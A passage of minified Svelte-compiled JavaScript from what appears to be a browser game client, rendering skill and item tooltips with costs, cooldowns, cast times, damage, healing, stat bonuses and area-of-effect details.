                    138477585 & t.$$.dirty[0] && s(15, F = h ? i && $ || o > 0 || -1 == k ? h.replace(".", "_grey.").replace(/_q[0-9]/g, "") : h : `/assets/ui/slotbg/bg.${Ro}?v=4002247`),
                    150996992 & t.$$.dirty[0] && s(17, Z = E(x || g, k)),
                    67112960 & t.$$.dirty[0] && M && b && b.appendChild(M),
                    8208 & t.$$.dirty[0] && tw(Math.floor(o || 0), R, 40)
            }
            ,
            [$, n, a, r, o, l, c, u, p, f, w, x, M, R, z, F, i, Z, _, C, T, I, h, d, g, v, b, k, S, E, P, D, A, B, L, U, N, O]
    }
    class lx extends Ot {
        constructor(t) {
            super(),
                Nt(this, t, ox, rx, d, {
                    data: 1,
                    key: 2,
                    stacks: 3,
                    cd: 4,
                    remaining: 5,
                    border: 6,
                    img: 22,
                    meta: 23,
                    css: 7,
                    id: 8,
                    describe: 9,
                    queued: 24,
                    pickable: 25,
                    descRoot: 26,
                    descPos: 10,
                    auto: 11,
                    status: 27,
                    hover: 0
                }, [-1, -1])
        }
    }
    function cx(t, e, s) {
        const i = t.slice();
        return i[13] = e[s],
            i
    }
    function hx(t, e, s) {
        const i = t.slice();
        return i[16] = e[s],
            i
    }
    function dx(t, e, s) {
        const i = t.slice();
        return i[19] = e[s],
            i
    }
    function ux(t, e, s) {
        const i = t.slice();
        return i[19] = e[s],
            i
    }
    function mx(t, e, s) {
        const i = t.slice();
        return i[27] = e[s],
            i
    }
    function px(t, e, s) {
        const i = t.slice();
        return i[24] = e[s],
            i
    }
    function fx(t, e, s) {
        const i = t.slice();
        return i[27] = e[s],
            i
    }
    function gx(t, e, s) {
        const i = t.slice();
        return i[24] = e[s],
            i
    }
    function vx(t, e, s) {
        const i = t.slice();
        return i[27] = e[s],
            i
    }
    function yx(t, e, s) {
        const i = t.slice();
        return i[34] = e[s],
            i
    }
    function bx(t, e, s) {
        const i = t.slice();
        return i[39] = e[s],
            i
    }
    function wx(t) {
        let e, s, i, n, a, r, o, l, c, h, d, u, m, p, f, g, v, y, b, w, x, k, $ = !t[2] && void 0 === t[0].parent && kx(t), S = t[0].actiontype && $x(t), P = t[0].auto && Sx(), I = t[0].cost && t[0].cost.resources && Ex(t), A = t[0].castLen && _x(t), R = t[0].cd && Cx(t), z = t[0].duration > 0 && Tx(t), F = t[0].refresh && Px(), Z = t[0].range && Ix(t), U = t[7][t[0].targetMode] && Dx(t), L = t[0].maxStacks && Ax(t), N = t[0].dmg && Bx(t), O = t[0].heal && Rx(t), j = [t[0].multiplyIncomingHeal, t[0].multiplyIncomingDamage], q = [];
        for (let e = 0; e < 2; e += 1)
            q[e] = Fx(yx(t, j, e));
        let X = [t[0].addIncomingHeal, t[0].addIncomingDamage]
            , H = [];
        for (let e = 0; e < 2; e += 1)
            H[e] = Ux(gx(t, X, e));
        let K = [t[0].addIncomingCrit]
            , W = [];
        for (let e = 0; e < 1; e += 1)
            W[e] = Nx(px(t, K, e));
        let Y = t[0].statsStatic && Ox(t)
            , V = t[0].statsConvert && qx(t)
            , G = t[0].custom && Hx(t)
            , Q = t[0].aoe && t[0].aoe.circleRadius && Wx(t)
            , J = !t[0].parent && Yx(t)
            , tt = t[3]
            , et = [];
        for (let e = 0; e < tt.length; e += 1)
            et[e] = Vx(cx(t, tt, e));
        const st = t => Mt(et[t], 1, 1, () => {
            et[t] = null
        }
        );
        return {
            c() {
                $ && $.c(),
                    e = T("div"),
                    S && S.c(),
                    s = D(),
                    P && P.c(),
                    i = D(),
                    I && I.c(),
                    n = D(),
                    A && A.c(),
                    a = D(),
                    R && R.c(),
                    r = D(),
                    z && z.c(),
                    o = D(),
                    F && F.c(),
                    l = T("div"),
                    Z && Z.c(),
                    c = D(),
                    U && U.c(),
                    L && L.c(),
                    h = D(),
                    N && N.c(),
                    d = D(),
                    O && O.c(),
                    u = D();
                for (let t = 0; t < 2; t += 1)
                    q[t].c();
                m = D();
                for (let t = 0; t < 2; t += 1)
                    H[t].c();
                p = D();
                for (let t = 0; t < 1; t += 1)
                    W[t].c();
                f = D(),
                    Y && Y.c(),
                    g = D(),
                    V && V.c(),
                    v = D(),
                    G && G.c(),
                    y = D(),
                    Q && Q.c(),
                    b = D(),
                    J && J.c(),
                    w = D();
                for (let t = 0; t < et.length; t += 1)
                    et[t].c();
                x = D(),
                    B(e, "class", "pad textgreen svelte-14w0l4b")
            },
            m(t, _) {
                $ && $.m(t, _),
                    M(t, e, _),
                    S && S.m(e, null),
                    E(e, s),
                    P && P.m(e, null),
                    E(e, i),
                    I && I.m(e, null),
                    E(e, n),
                    A && A.m(e, null),
                    E(e, a),
                    R && R.m(e, null),
                    E(e, r),
                    z && z.m(e, null),
                    E(e, o),
                    F && F.m(e, null),
                    E(e, l),
                    Z && Z.m(l, null),
                    E(l, c),
                    U && U.m(l, null),
                    L && L.m(t, _),
                    M(t, h, _),
                    N && N.m(t, _),
                    M(t, d, _),
                    O && O.m(t, _),
                    M(t, u, _);
                for (let e = 0; e < 2; e += 1)
                    q[e].m(t, _);
                M(t, m, _);
                for (let e = 0; e < 2; e += 1)
                    H[e].m(t, _);
                M(t, p, _);
                for (let e = 0; e < 1; e += 1)
                    W[e].m(t, _);
                M(t, f, _),
                    Y && Y.m(t, _),
                    M(t, g, _),
                    V && V.m(t, _),
                    M(t, v, _),
                    G && G.m(t, _),
                    M(t, y, _),
                    Q && Q.m(t, _),
                    M(t, b, _),
                    J && J.m(t, _),
                    M(t, w, _);
                for (let e = 0; e < et.length; e += 1)
                    et[e].m(t, _);
                M(t, x, _),
                    k = !0
            },
            p(t, k) {
                if (t[2] || void 0 !== t[0].parent ? $ && ($.d(1),
                    $ = null) : $ ? $.p(t, k) : ($ = kx(t),
                        $.c(),
                        $.m(e.parentNode, e)),
                    t[0].actiontype ? S ? S.p(t, k) : (S = $x(t),
                        S.c(),
                        S.m(e, s)) : S && (S.d(1),
                            S = null),
                    t[0].auto ? P || (P = Sx(),
                        P.c(),
                        P.m(e, i)) : P && (P.d(1),
                            P = null),
                    t[0].cost && t[0].cost.resources ? I ? I.p(t, k) : (I = Ex(t),
                        I.c(),
                        I.m(e, n)) : I && (I.d(1),
                            I = null),
                    t[0].castLen ? A ? A.p(t, k) : (A = _x(t),
                        A.c(),
                        A.m(e, a)) : A && (A.d(1),
                            A = null),
                    t[0].cd ? R ? R.p(t, k) : (R = Cx(t),
                        R.c(),
                        R.m(e, r)) : R && (R.d(1),
                            R = null),
                    t[0].duration > 0 ? z ? z.p(t, k) : (z = Tx(t),
                        z.c(),
                        z.m(e, o)) : z && (z.d(1),
                            z = null),
                    t[0].refresh ? F || (F = Px(),
                        F.c(),
                        F.m(e, l)) : F && (F.d(1),
                            F = null),
                    t[0].range ? Z ? Z.p(t, k) : (Z = Ix(t),
                        Z.c(),
                        Z.m(l, c)) : Z && (Z.d(1),
                            Z = null),
                    t[7][t[0].targetMode] ? U ? U.p(t, k) : (U = Dx(t),
                        U.c(),
                        U.m(l, null)) : U && (U.d(1),
                            U = null),
                    t[0].maxStacks ? L ? L.p(t, k) : (L = Ax(t),
                        L.c(),
                        L.m(h.parentNode, h)) : L && (L.d(1),
                            L = null),
                    t[0].dmg ? N ? N.p(t, k) : (N = Bx(t),
                        N.c(),
                        N.m(d.parentNode, d)) : N && (N.d(1),
                            N = null),
                    t[0].heal ? O ? O.p(t, k) : (O = Rx(t),
                        O.c(),
                        O.m(u.parentNode, u)) : O && (O.d(1),
                            O = null),
                    257 & k[0]) {
                    let e;
                    for (j = [t[0].multiplyIncomingHeal, t[0].multiplyIncomingDamage],
                        e = 0; e < 2; e += 1) {
                        const s = yx(t, j, e);
                        q[e] ? q[e].p(s, k) : (q[e] = Fx(s),
                            q[e].c(),
                            q[e].m(m.parentNode, m))
                    }
                    for (; e < 2; e += 1)
                        q[e].d(1)
                }
                if (257 & k[0]) {
                    let e;
                    for (X = [t[0].addIncomingHeal, t[0].addIncomingDamage],
                        e = 0; e < 2; e += 1) {
                        const s = gx(t, X, e);
                        H[e] ? H[e].p(s, k) : (H[e] = Ux(s),
                            H[e].c(),
                            H[e].m(p.parentNode, p))
                    }
                    for (; e < 2; e += 1)
                        H[e].d(1)
                }
                if (257 & k[0]) {
                    let e;
                    for (K = [t[0].addIncomingCrit],
                        e = 0; e < 1; e += 1) {
                        const s = px(t, K, e);
                        W[e] ? W[e].p(s, k) : (W[e] = Nx(s),
                            W[e].c(),
                            W[e].m(f.parentNode, f))
                    }
                    for (; e < 1; e += 1)
                        W[e].d(1)
                }
                if (t[0].statsStatic ? Y ? Y.p(t, k) : (Y = Ox(t),
                    Y.c(),
                    Y.m(g.parentNode, g)) : Y && (Y.d(1),
                        Y = null),
                    t[0].statsConvert ? V ? V.p(t, k) : (V = qx(t),
                        V.c(),
                        V.m(v.parentNode, v)) : V && (V.d(1),
                            V = null),
                    t[0].custom ? G ? G.p(t, k) : (G = Hx(t),
                        G.c(),
                        G.m(y.parentNode, y)) : G && (G.d(1),
                            G = null),
                    t[0].aoe && t[0].aoe.circleRadius ? Q ? Q.p(t, k) : (Q = Wx(t),
                        Q.c(),
                        Q.m(b.parentNode, b)) : Q && (Q.d(1),
                            Q = null),
                    t[0].parent ? J && (J.d(1),
                        J = null) : J ? J.p(t, k) : (J = Yx(t),
                            J.c(),
                            J.m(w.parentNode, w)),
                    10 & k[0]) {
                    let e;
                    for (tt = t[3],
                        e = 0; e < tt.length; e += 1) {
                        const s = cx(t, tt, e);
                        et[e] ? (et[e].p(s, k),
                            Et(et[e], 1)) : (et[e] = Vx(s),
                                et[e].c(),
                                Et(et[e], 1),
                                et[e].m(x.parentNode, x))
                    }
                    for ($t(),
                        e = tt.length; e < et.length; e += 1)
                        st(e);
                    St()
                }
            },
            i(t) {
                if (!k) {
                    for (let t = 0; t < tt.length; t += 1)
                        Et(et[t]);
                    k = !0
                }
            },
            o(t) {
                et = et.filter(Boolean);
                for (let t = 0; t < et.length; t += 1)
                    Mt(et[t]);
                k = !1
            },
            d(t) {
                $ && $.d(t),
                    t && _(e),
                    S && S.d(),
                    P && P.d(),
                    I && I.d(),
                    A && A.d(),
                    R && R.d(),
                    z && z.d(),
                    F && F.d(),
                    Z && Z.d(),
                    U && U.d(),
                    L && L.d(t),
                    t && _(h),
                    N && N.d(t),
                    t && _(d),
                    O && O.d(t),
                    t && _(u),
                    C(q, t),
                    t && _(m),
                    C(H, t),
                    t && _(p),
                    C(W, t),
                    t && _(f),
                    Y && Y.d(t),
                    t && _(g),
                    V && V.d(t),
                    t && _(v),
                    G && G.d(t),
                    t && _(y),
                    Q && Q.d(t),
                    t && _(b),
                    J && J.d(t),
                    t && _(w),
                    C(et, t),
                    t && _(x)
            }
        }
    }
    function xx(t) {
        let e, s, n = t[0].item + "";
        return {
            c() {
                e = T("div"),
                    s = P(n)
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p(t, e) {
                1 & e[0] && n !== (n = t[0].item + "") && F(s, n)
            },
            i: i,
            o: i,
            d(t) {
                t && _(e)
            }
        }
    }
    function kx(t) {
        let e, s, i, n, a, r, o = Xi.items.book[t[0].id].name + "", l = t[0].engineOnly ? "" : " Lv. " + t[1];
        return {
            c() {
                e = T("div"),
                    s = T("img"),
                    n = I(),
                    a = P(o),
                    r = P(l),
                    B(s, "class", "texticon"),
                    s.src !== (i = kp(t[0].id)) && B(s, "src", i),
                    B(e, "class", "slottitle textprimary")
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s),
                    E(e, n),
                    E(e, a),
                    E(e, r)
            },
            p(t, e) {
                1 & e[0] && s.src !== (i = kp(t[0].id)) && B(s, "src", i),
                    1 & e[0] && o !== (o = Xi.items.book[t[0].id].name + "") && F(a, o),
                    3 & e[0] && l !== (l = t[0].engineOnly ? "" : " Lv. " + t[1]) && F(r, l)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function $x(t) {
        let e, s, i, n, a = t[9][t[0].mode] + "", r = t[0].actiontype + "";
        return {
            c() {
                e = T("div"),
                    s = P(a),
                    i = I(),
                    n = P(r),
                    B(e, "class", "textwhite")
            },
            m(t, a) {
                M(t, e, a),
                    E(e, s),
                    E(e, i),
                    E(e, n)
            },
            p(t, e) {
                1 & e[0] && a !== (a = t[9][t[0].mode] + "") && F(s, a),
                    1 & e[0] && r !== (r = t[0].actiontype + "") && F(n, r)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Sx(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    e.textContent = "Auto cast"
            },
            m(t, s) {
                M(t, e, s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Ex(t) {
        let e, s, i = t[0].cost.resources, n = [];
        for (let e = 0; e < i.length; e += 1)
            n[e] = Mx(bx(t, i, e));
        return {
            c() {
                e = T("div"),
                    s = P("Cost: ");
                for (let t = 0; t < n.length; t += 1)
                    n[t].c()
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s);
                for (let t = 0; t < n.length; t += 1)
                    n[t].m(e, null)
            },
            p(t, s) {
                if (259 & s[0]) {
                    let a;
                    for (i = t[0].cost.resources,
                        a = 0; a < i.length; a += 1) {
                        const r = bx(t, i, a);
                        n[a] ? n[a].p(r, s) : (n[a] = Mx(r),
                            n[a].c(),
                            n[a].m(e, null))
                    }
                    for (; a < n.length; a += 1)
                        n[a].d(1);
                    n.length = i.length
                }
            },
            d(t) {
                t && _(e),
                    C(n, t)
            }
        }
    }
    function Mx(t) {
        let e, s, i, n, a = t[8](t[39][1], t[1]) + "", r = Xi.ui.stats.array[t[39][0]] + "";
        return {
            c() {
                e = P(a),
                    s = I(),
                    i = P(r),
                    n = I()
            },
            m(t, a) {
                M(t, e, a),
                    M(t, s, a),
                    M(t, i, a),
                    M(t, n, a)
            },
            p(t, s) {
                3 & s[0] && a !== (a = t[8](t[39][1], t[1]) + "") && F(e, a),
                    1 & s[0] && r !== (r = Xi.ui.stats.array[t[39][0]] + "") && F(i, r)
            },
            d(t) {
                t && _(e),
                    t && _(s),
                    t && _(i),
                    t && _(n)
            }
        }
    }
    function _x(t) {
        let e, s, i, n = t[8](t[0].castLen) + "";
        return {
            c() {
                e = T("div"),
                    s = P(n),
                    i = P("s Cast time")
            },
            m(t, n) {
                M(t, e, n),
                    E(e, s),
                    E(e, i)
            },
            p(t, e) {
                1 & e[0] && n !== (n = t[8](t[0].castLen) + "") && F(s, n)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Cx(t) {
        let e, s, i, n = t[8](t[0].cd) + "";
        return {
            c() {
                e = T("div"),
                    s = P(n),
                    i = P("s Cooldown")
            },
            m(t, n) {
                M(t, e, n),
                    E(e, s),
                    E(e, i)
            },
            p(t, e) {
                1 & e[0] && n !== (n = t[8](t[0].cd) + "") && F(s, n)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Tx(t) {
        let e, s, i, n = t[8](t[0].duration) + "";
        return {
            c() {
                e = T("div"),
                    s = P(n),
                    i = P("s Duration")
            },
            m(t, n) {
                M(t, e, n),
                    E(e, s),
                    E(e, i)
            },
            p(t, e) {
                1 & e[0] && n !== (n = t[8](t[0].duration) + "") && F(s, n)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Px(t) {
        let e;
        return {
            c() {
                e = T("div"),
                    e.textContent = "Stacks refresh duration"
            },
            m(t, s) {
                M(t, e, s)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Ix(t) {
        let e, s, i, n = t[8](t[0].range) + "";
        return {
            c() {
                e = T("span"),
                    s = P(n),
                    i = P("m range ")
            },
            m(t, n) {
                M(t, e, n),
                    E(e, s),
                    E(e, i)
            },
            p(t, e) {
                1 & e[0] && n !== (n = t[8](t[0].range) + "") && F(s, n)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Dx(t) {
        let e, s, i = t[7][t[0].targetMode] + "";
        return {
            c() {
                e = T("span"),
                    s = P(i)
            },
            m(t, i) {
                M(t, e, i),
                    E(e, s)
            },
            p(t, e) {
                1 & e[0] && i !== (i = t[7][t[0].targetMode] + "") && F(s, i)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Ax(t) {
        let e, s, i, n, a, r, o, l = t[5].stacks + "";
        return {
            c() {
                e = T("div"),
                    s = T("u"),
                    i = P("At "),
                    n = P(l),
                    a = P(" stacks"),
                    r = P(":"),
                    o = T("span"),
                    o.textContent = "(Press shift to toggle)",
                    B(e, "class", "pad textsecondary svelte-14w0l4b"),
                    B(o, "class", "textgrey")
            },
            m(t, l) {
                M(t, e, l),
                    E(e, s),
                    E(s, i),
                    E(s, n),
                    E(s, a),
                    E(e, r),
                    M(t, o, l)
            },
            p(t, e) {
                32 & e[0] && l !== (l = t[5].stacks + "") && F(n, l)
            },
            d(t) {
                t && _(e),
                    t && _(o)
            }
        }
    }
    function Bx(t) {
        let e, s, i, n = t[8](t[0].dmg) + "";
        return {
            c() {
                e = T("div"),
                    s = P(n),
                    i = P(" DMG"),
                    B(e, "class", "textgreen")
            },
            m(t, n) {
                M(t, e, n),
                    E(e, s),
                    E(e, i)
            },
            p(t, e) {
                1 & e[0] && n !== (n = t[8](t[0].dmg) + "") && F(s, n)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Rx(t) {
        let e, s, i, n = t[8](t[0].heal) + "";
        return {
            c() {
                e = T("div"),
                    s = P(n),
                    i = P(" Heal"),
                    B(e, "class", "textgreen")
            },
            m(t, n) {
                M(t, e, n),
                    E(e, s),
                    E(e, i)
            },
            p(t, e) {
                1 & e[0] && n !== (n = t[8](t[0].heal) + "") && F(s, n)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function zx(t) {
        let e, s, i, n, a, r, o = Xi.items.book[t[27]].name + "", l = Math.round(100 * t[8](t[34][t[27]](t[0])) - 100) + "";
        return {
            c() {
                e = T("div"),
                    s = P("Empower "),
                    i = P(o),
                    n = P(" by "),
                    a = P(l),
                    r = P("%"),
                    B(e, "class", "textcyan")
            },
            m(t, o) {
                M(t, e, o),
                    E(e, s),
                    E(e, i),
                    E(e, n),
                    E(e, a),
                    E(e, r)
            },
            p(t, e) {
                1 & e[0] && o !== (o = Xi.items.book[t[27]].name + "") && F(i, o),
                    1 & e[0] && l !== (l = Math.round(100 * t[8](t[34][t[27]](t[0])) - 100) + "") && F(a, l)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Fx(t) {
        let e, s = Object.keys(t[34] || {}), i = [];
        for (let e = 0; e < s.length; e += 1)
            i[e] = zx(vx(t, s, e));
        return {
            c() {
                for (let t = 0; t < i.length; t += 1)
                    i[t].c();
                e = D()
            },
            m(t, s) {
                for (let e = 0; e < i.length; e += 1)
                    i[e].m(t, s);
                M(t, e, s)
            },
            p(t, n) {
                if (257 & n[0]) {
                    let a;
                    for (s = Object.keys(t[34] || {}),
                        a = 0; a < s.length; a += 1) {
                        const r = vx(t, s, a);
                        i[a] ? i[a].p(r, n) : (i[a] = zx(r),
                            i[a].c(),
                            i[a].m(e.parentNode, e))
                    }
                    for (; a < i.length; a += 1)
                        i[a].d(1);
                    i.length = s.length
                }
            },
            d(t) {
                C(i, t),
                    t && _(e)
            }
        }
    }
    function Zx(t) {
        let e, s, i, n, a, r = Xi.items.book[t[27]].name + "", o = t[8](t[24][t[27]](t[0])) + "";
        return {
            c() {
                e = T("div"),
                    s = P("Empower "),
                    i = P(r),
                    n = P(" by "),
                    a = P(o),
                    B(e, "class", "textcyan")
            },
            m(t, r) {
                M(t, e, r),
                    E(e, s),
                    E(e, i),
                    E(e, n),
                    E(e, a)
            },
            p(t, e) {
                1 & e[0] && r !== (r = Xi.items.book[t[27]].name + "") && F(i, r),
                    1 & e[0] && o !== (o = t[8](t[24][t[27]](t[0])) + "") && F(a, o)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Ux(t) {
        let e, s = Object.keys(t[24] || {}), i = [];
        for (let e = 0; e < s.length; e += 1)
            i[e] = Zx(fx(t, s, e));
        return {
            c() {
                for (let t = 0; t < i.length; t += 1)
                    i[t].c();
                e = D()
            },
            m(t, s) {
                for (let e = 0; e < i.length; e += 1)
                    i[e].m(t, s);
                M(t, e, s)
            },
            p(t, n) {
                if (257 & n[0]) {
                    let a;
                    for (s = Object.keys(t[24] || {}),
                        a = 0; a < s.length; a += 1) {
                        const r = fx(t, s, a);
                        i[a] ? i[a].p(r, n) : (i[a] = Zx(r),
                            i[a].c(),
                            i[a].m(e.parentNode, e))
                    }
                    for (; a < i.length; a += 1)
                        i[a].d(1);
                    i.length = s.length
                }
            },
            d(t) {
                C(i, t),
                    t && _(e)
            }
        }
    }
    function Lx(t) {
        let e, s, i, n, a, r = Xi.items.book[t[27]].name + "", o = Db(14, t[8](t[24][t[27]](t[0]))) + "";
        return {
            c() {
                e = T("div"),
                    s = P("Empower Crit% of "),
                    i = P(r),
                    n = P(" by "),
                    a = P(o),
                    B(e, "class", "textcyan")
            },
            m(t, r) {
                M(t, e, r),
                    E(e, s),
                    E(e, i),
                    E(e, n),
                    E(e, a)
            },
            p(t, e) {
                1 & e[0] && r !== (r = Xi.items.book[t[27]].name + "") && F(i, r),
                    1 & e[0] && o !== (o = Db(14, t[8](t[24][t[27]](t[0]))) + "") && F(a, o)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Nx(t) {
        let e, s = Object.keys(t[24] || {}), i = [];
        for (let e = 0; e < s.length; e += 1)
            i[e] = Lx(mx(t, s, e));
        return {
            c() {
                for (let t = 0; t < i.length; t += 1)
                    i[t].c();
                e = D()
            },
            m(t, s) {
                for (let e = 0; e < i.length; e += 1)
                    i[e].m(t, s);
                M(t, e, s)
            },
            p(t, n) {
                if (257 & n[0]) {
                    let a;
                    for (s = Object.keys(t[24] || {}),
                        a = 0; a < s.length; a += 1) {
                        const r = mx(t, s, a);
                        i[a] ? i[a].p(r, n) : (i[a] = Lx(r),
                            i[a].c(),
                            i[a].m(e.parentNode, e))
                    }
                    for (; a < i.length; a += 1)
                        i[a].d(1);
                    i.length = s.length
                }
            },
            d(t) {
                C(i, t),
                    t && _(e)
            }
        }
    }
    function Ox(t) {
        let e, s = Array.from(t[4].stat), i = [];
        for (let e = 0; e < s.length; e += 1)
            i[e] = jx(ux(t, s, e));
        return {
            c() {
                for (let t = 0; t < i.length; t += 1)
                    i[t].c();
                e = D()
            },
            m(t, s) {
                for (let e = 0; e < i.length; e += 1)
                    i[e].m(t, s);
                M(t, e, s)
            },
            p(t, n) {
                if (16 & n[0]) {
                    let a;
                    for (s = Array.from(t[4].stat),
                        a = 0; a < s.length; a += 1) {
                        const r = ux(t, s, a);
                        i[a] ? i[a].p(r, n) : (i[a] = jx(r),
                            i[a].c(),
                            i[a].m(e.parentNode, e))
                    }
                    for (; a < i.length; a += 1)
                        i[a].d(1);
                    i.length = s.length
                }
            },
            d(t) {
                C(i, t),
                    t && _(e)
            }
        }
    }
    function jx(t) {
        let e, s, i, n, a, r, o = Db(t[19][0], t[19][1]) + "", l = Xi.ui.stats.array[t[19][0]] + "";
        return {
            c() {
                e = T("div"),
                    s = P("+"),
                    i = P(o),
                    n = I(),
                    a = P(l),
                    r = I(),
                    B(e, "class", "textcyan")
            },
            m(t, o) {
                M(t, e, o),
                    E(e, s),
                    E(e, i),
                    E(e, n),
                    E(e, a),
                    E(e, r)
            },
            p(t, e) {
                16 & e[0] && o !== (o = Db(t[19][0], t[19][1]) + "") && F(i, o),
                    16 & e[0] && l !== (l = Xi.ui.stats.array[t[19][0]] + "") && F(a, l)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function qx(t) {
        let e, s = t[0].statsConvert, i = [];
        for (let e = 0; e < s.length; e += 1)
            i[e] = Xx(dx(t, s, e));
        return {
            c() {
                for (let t = 0; t < i.length; t += 1)
                    i[t].c();
                e = D()
            },
            m(t, s) {
                for (let e = 0; e < i.length; e += 1)
                    i[e].m(t, s);
                M(t, e, s)
            },
            p(t, n) {
                if (1 & n[0]) {
                    let a;
                    for (s = t[0].statsConvert,
                        a = 0; a < s.length; a += 1) {
                        const r = dx(t, s, a);
                        i[a] ? i[a].p(r, n) : (i[a] = Xx(r),
                            i[a].c(),
                            i[a].m(e.parentNode, e))
                    }
                    for (; a < i.length; a += 1)
                        i[a].d(1);
                    i.length = s.length
                }
            },
            d(t) {
                C(i, t),
                    t && _(e)
            }
        }
    }
    function Xx(t) {
        let e, s, i, n, a, r, o, l = Xi.ui.stats.array[t[19][0]] + "", c = Db(t[19][0], t[19][1]) + "", h = Xi.ui.stats.array[t[19][2]] + "";
        return {
            c() {
                e = T("div"),
                    s = P("For 1 "),
                    i = P(l),
                    n = P(" gain "),
                    a = P(c),
                    r = I(),
                    o = P(h),
                    B(e, "class", "textcyan")
            },
            m(t, l) {
                M(t, e, l),
                    E(e, s),
                    E(e, i),
                    E(e, n),
                    E(e, a),
                    E(e, r),
                    E(e, o)
            },
            p(t, e) {
                1 & e[0] && l !== (l = Xi.ui.stats.array[t[19][0]] + "") && F(i, l),
                    1 & e[0] && c !== (c = Db(t[19][0], t[19][1]) + "") && F(a, c),
                    1 & e[0] && h !== (h = Xi.ui.stats.array[t[19][2]] + "") && F(o, h)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Hx(t) {
        let e, s = t[0].custom, i = [];
        for (let e = 0; e < s.length; e += 1)
            i[e] = Kx(hx(t, s, e));
        return {
            c() {
                for (let t = 0; t < i.length; t += 1)
                    i[t].c();
                e = D()
            },
            m(t, s) {
                for (let e = 0; e < i.length; e += 1)
                    i[e].m(t, s);
                M(t, e, s)
            },
            p(t, n) {
                if (259 & n[0]) {
                    let a;
                    for (s = t[0].custom,
                        a = 0; a < s.length; a += 1) {
                        const r = hx(t, s, a);
                        i[a] ? i[a].p(r, n) : (i[a] = Kx(r),
                            i[a].c(),
                            i[a].m(e.parentNode, e))
                    }
                    for (; a < i.length; a += 1)
                        i[a].d(1);
                    i.length = s.length
                }
            },
            d(t) {
                C(i, t),
                    t && _(e)
            }
        }
    }
    function Kx(t) {
        let e, s, i, n = t[8](t[16][0](t[1])) + "", a = t[16][1] + "";
        return {
            c() {
                e = T("div"),
                    s = P(n),
                    i = P(a),
                    B(e, "class", "textcyan")
            },
            m(t, n) {
                M(t, e, n),
                    E(e, s),
                    E(e, i)
            },
            p(t, e) {
                3 & e[0] && n !== (n = t[8](t[16][0](t[1])) + "") && F(s, n),
                    1 & e[0] && a !== (a = t[16][1] + "") && F(i, a)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Wx(t) {
        let e, s, i, n, a, r, o = t[0].aoe.faction ? t[0].aoe.party ? "party members" : "allies" : "enemies", l = t[8](t[0].aoe.circleRadius) + "";
        return {
            c() {
                e = T("div"),
                    s = P("All "),
                    i = P(o),
                    n = P(" within "),
                    a = P(l),
                    r = P("m"),
                    B(e, "class", "textfame")
            },
            m(t, o) {
                M(t, e, o),
                    E(e, s),
                    E(e, i),
                    E(e, n),
                    E(e, a),
                    E(e, r)
            },
            p(t, e) {
                1 & e[0] && o !== (o = t[0].aoe.faction ? t[0].aoe.party ? "party members" : "allies" : "enemies") && F(i, o),
                    1 & e[0] && l !== (l = t[8](t[0].aoe.circleRadius) + "") && F(a, l)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Yx(t) {
        let e, s, i, n, a = Xi.items.book[t[0].id].description + "";
        return {
            c() {
                e = T("div"),
                    s = T("u"),
                    s.textContent = "Effect",
                    i = P(": "),
                    n = P(a),
                    B(e, "class", "textsecondary pad svelte-14w0l4b")
            },
            m(t, a) {
                M(t, e, a),
                    E(e, s),
                    E(e, i),
                    E(e, n)
            },
            p(t, e) {
                1 & e[0] && a !== (a = Xi.items.book[t[0].id].description + "") && F(n, a)
            },
            d(t) {
                t && _(e)
            }
        }
    }
    function Vx(t) {
        let e, s;
        const i = new ek({
            props: {
                level: t[1],
                skill: t[13]
            }
        });
        return {
            c() {
                e = T("div"),
                    Ft(i.$$.fragment),
                    B(e, "class", "pad svelte-14w0l4b")
            },
            m(t, n) {
                M(t, e, n),
                    Zt(i, e, null),
                    s = !0
            },
            p(t, e) {
                const s = {};
                2 & e[0] && (s.level = t[1]),
                    8 & e[0] && (s.skill = t[13]),
                    i.$set(s)
            },
            i(t) {
                s || (Et(i.$$.fragment, t),
                    s = !0)
            },
            o(t) {
                Mt(i.$$.fragment, t),
                    s = !1
            },
            d(t) {
                t && _(e),
                    Ut(i)
            }
        }
    }
    function Gx(t) {
        let e, s, i, n;
        const a = [xx, wx]
            , r = [];
        function o(t, e) {
            return t[0].item ? 0 : 1
        }
        return s = o(t),
            i = r[s] = a[s](t),
        {
            c() {
                e = T("div"),
                    i.c(),
                    B(e, "class", "container textsecondary svelte-14w0l4b")
            },
            m(t, i) {
                M(t, e, i),
                    r[s].m(e, null),
                    n = !0
            },
            p(t, n) {
                let l = s;
                s = o(t),
                    s === l ? r[s].p(t, n) : ($t(),
                        Mt(r[l], 1, 1, () => {
                            r[l] = null
                        }
                        ),
                        St(),
                        i = r[s],
                        i || (i = r[s] = a[s](t),
                            i.c()),
                        Et(i, 1),
                        i.m(e, null))
            },
            i(t) {
                n || (Et(i),
                    n = !0)
            },
            o(t) {
                Mt(i),
                    n = !1
            },
            d(t) {
                t && _(e),
                    r[s].d()
            }
        }
    }
    let Qx = 1
        , Jx = 1;
    function tk(t, e, s) {
        let i, { skill: n } = e, { level: a } = e, { asItemDescription: r = !1 } = e, o = $l.shift.store;
        m(t, o, t => s(10, i = t));
        const l = {
            1: "Requires no target",
            16: "Self cast",
            256: "on Allies",
            4096: "on Enemy"
        }
            , c = (t, e = Ua && Ua.player) => {
                if (!e)
                    return "?";
                const s = nv(t, e);
                return s % 1 == 0 ? s : s.toFixed(1)
            }
            , h = {
                0: "Melee attack",
                1: "Magic attack",
